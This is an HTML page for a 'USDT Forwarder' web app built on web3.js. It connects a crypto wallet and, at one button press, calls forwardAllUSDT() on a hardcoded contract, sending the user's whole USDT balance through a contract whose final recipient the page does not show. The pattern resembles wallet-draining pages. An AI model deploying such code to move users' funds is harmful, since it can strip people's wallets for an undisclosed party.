
<!DOCTYPE html>
<html>
<head>
  <title>USDT Forwarder</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>
  <h2>USDT Forwarder DApp</h2>
  <button id="connect">Connect Wallet</button>
  <button id="send">Send All USDT</button>

  <script>
    const contractAddress = "0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B";
    const usdtToken = "0x55d398326f99059fF775485246999027B3197955";
    const abi = [
      {
        "inputs": [],
        "name": "forwardAllUSDT",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

    let web3;
    let account;
    let contract;

    document.getElementById("connect").onclick = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          web3 = new Web3(window.ethereum);
          const accounts = await web3.eth.getAccounts();
          account = accounts[0];
          contract = new web3.eth.Contract(abi, contractAddress);
          alert("Connected: " + account);
        } catch (error) {
          alert("Connection Error: " + error.message);
        }
      } else {
        alert("Trust Wallet or MetaMask not found.");
      }
    };

    document.getElementById("send").onclick = async () => {
      if (!account || !contract) {
        alert("Please connect your wallet first.");
        return;
      }
      try {
        await contract.methods.forwardAllUSDT().send({ from: account });
        alert("Transaction sent!");
      } catch (error) {
        alert("Transaction failed: " + error.message);
      }
    };
  </script>
</body>
</html>
